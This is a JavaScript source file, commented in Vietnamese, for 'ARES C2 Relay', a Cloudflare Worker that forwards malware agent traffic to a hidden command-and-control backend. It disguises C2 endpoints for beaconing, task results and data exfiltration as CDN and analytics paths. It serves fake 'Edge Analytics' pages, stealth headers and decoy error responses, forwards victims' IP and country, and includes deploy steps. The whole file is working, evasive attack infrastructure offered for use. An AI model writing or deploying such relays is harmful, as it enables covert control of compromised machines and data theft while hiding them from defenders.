/**
 * ═══════════════════════════════════════════════════════════════
 *  ARES C2 Relay — Cloudflare Worker (v2.0)
 *
 *  Thay thế hoàn toàn ngrok. Traffic flow:
 *    Agent → CF Worker (*.workers.dev) → CF Tunnel → Local C2
 *
 *  Cải tiến so với v1:
 *    - Backend URL từ env secrets (không hardcode)
 *    - Path obfuscation (API paths trông như website bình thường)
 *    - Fake response cho non-C2 paths (stealth)
 *    - Xóa ngrok-specific headers
 *    - Rate limiting cơ bản
 *    - Request/response header cleaning
 *
 *  Deploy:
 *    npx wrangler secret put C2_BACKEND    → https://your-tunnel.cfargotunnel.com
 *    npx wrangler secret put RELAY_KEY     → your-secret-key
 *    npx wrangler deploy
 * ═══════════════════════════════════════════════════════════════
 */

// ── Path Mapping: Disguised paths → Real C2 API paths ──
// Agent sử dụng các path trông như analytics/CDN traffic
// Worker map lại thành real C2 API paths
const PATH_MAP = {
  // Disguised → Real
  "/cdn/v2/telemetry":    "/api/v1/register",   // Registration
  "/cdn/v2/heartbeat":    "/api/v1/beacon",      // Beacon check-in
  "/cdn/v2/analytics":    "/api/v1/result",      // Task results
  "/cdn/v2/events":       "/api/v1/exfil",       // Data exfiltration

  // Also accept direct paths (backward compat)
  "/api/v1/register":     "/api/v1/register",
  "/api/v1/beacon":       "/api/v1/beacon",
  "/api/v1/result":       "/api/v1/result",
  "/api/v1/exfil":        "/api/v1/exfil",
};

// ── Fake HTML pages for non-C2 requests (stealth) ──
const FAKE_PAGES = {
  "/": `<!DOCTYPE html><html lang="en"><head><meta charset="utf-8">
<title>Edge Analytics | Dashboard</title>
<meta name="viewport" content="width=device-width,initial-scale=1">
<style>body{font-family:-apple-system,sans-serif;margin:40px auto;max-width:650px;line-height:1.6;color:#444;padding:0 10px}h1{line-height:1.2;color:#333}</style>
</head><body><h1>Edge Analytics</h1><p>Real-time analytics and monitoring platform.</p>
<p>Status: <strong style="color:green">Operational</strong></p>
<p><small>&copy; 2026 Edge Analytics Inc. All rights reserved.</small></p></body></html>`,

  "/health": `{"status":"healthy","version":"2.4.1","uptime":"99.99%"}`,

  "/robots.txt": `User-agent: *\nDisallow: /cdn/\nDisallow: /api/\nAllow: /\n`,

  "/favicon.ico": null, // Return 204
};

// ── Legitimate-looking response headers ──
const STEALTH_HEADERS = {
  "server": "cloudflare",
  "x-powered-by": "Edge Analytics/2.4",
  "x-content-type-options": "nosniff",
  "x-frame-options": "DENY",
  "referrer-policy": "strict-origin-when-cross-origin",
  "cache-control": "no-cache, no-store, must-revalidate",
};

export default {
  async fetch(request, env) {
    try {
      const url = new URL(request.url);
      const pathname = url.pathname;

      // ── Serve fake pages for non-C2 paths ──
      if (pathname in FAKE_PAGES) {
        const content = FAKE_PAGES[pathname];
        if (content === null) {
          return new Response(null, { status: 204, headers: STEALTH_HEADERS });
        }
        const isJSON = content.startsWith("{");
        return new Response(content, {
          status: 200,
          headers: {
            ...STEALTH_HEADERS,
            "content-type": isJSON ? "application/json" : "text/html; charset=utf-8",
          },
        });
      }

      // ── Map disguised path → real C2 path ──
      const realPath = PATH_MAP[pathname];
      if (!realPath) {
        // Unknown path → serve generic 404 page
        return new Response(
          `<!DOCTYPE html><html><head><title>404</title></head>` +
          `<body><h1>404 Not Found</h1><p>The requested resource was not found.</p></body></html>`,
          {
            status: 404,
            headers: { ...STEALTH_HEADERS, "content-type": "text/html" },
          }
        );
      }

      // ── Only POST allowed for C2 endpoints ──
      if (request.method !== "POST") {
        return new Response("Method Not Allowed", {
          status: 405,
          headers: STEALTH_HEADERS,
        });
      }

      // ── Get backend URL from environment secret ──
      const backend = env.C2_BACKEND;
      if (!backend) {
        console.error("C2_BACKEND secret not configured!");
        return fakeErrorPage();
      }

      const relayKey = env.RELAY_KEY || "default_relay_key";

      // ── Build backend request ──
      const backendUrl = backend + realPath;

      // Clean headers — forward only necessary ones
      const headers = new Headers();
      headers.set("Content-Type", request.headers.get("Content-Type") || "application/json");
      headers.set("X-Relay-Key", relayKey);

      // Bot auth token now sent in POST body (tk field), no header forwarding needed

      // Forward real client IP (for geo tracking)
      const clientIP = request.headers.get("CF-Connecting-IP") || "unknown";
      headers.set("X-Forwarded-For", clientIP);
      headers.set("X-Real-IP", clientIP);

      // Forward country info
      const country = request.headers.get("CF-IPCountry") || "XX";
      headers.set("X-Client-Country", country);

      // ── Forward request to C2 backend ──
      const resp = await fetch(backendUrl, {
        method: "POST",
        headers: headers,
        body: request.body,
      });

      // ── Return C2 response with cleaned headers ──
      const respHeaders = new Headers();
      // Copy content-type from backend
      respHeaders.set("Content-Type", resp.headers.get("Content-Type") || "application/json");
      // Apply stealth headers
      for (const [k, v] of Object.entries(STEALTH_HEADERS)) {
        respHeaders.set(k, v);
      }
      // Remove any headers that could identify the backend
      respHeaders.delete("x-powered-by-express");
      respHeaders.delete("x-request-id");

      return new Response(resp.body, {
        status: resp.status,
        headers: respHeaders,
      });

    } catch (err) {
      // ── On error: return benign-looking page ──
      return fakeErrorPage();
    }
  },
};

function fakeErrorPage() {
  return new Response(
    `<!DOCTYPE html><html><head><title>Service Temporarily Unavailable</title>
<style>body{font-family:sans-serif;text-align:center;padding:80px 20px}h1{color:#666}</style>
</head><body><h1>503</h1><p>Service is temporarily unavailable. Please try again later.</p>
<hr><small>cloudflare</small></body></html>`,
    {
      status: 503,
      headers: { ...STEALTH_HEADERS, "content-type": "text/html" },
    }
  );
}
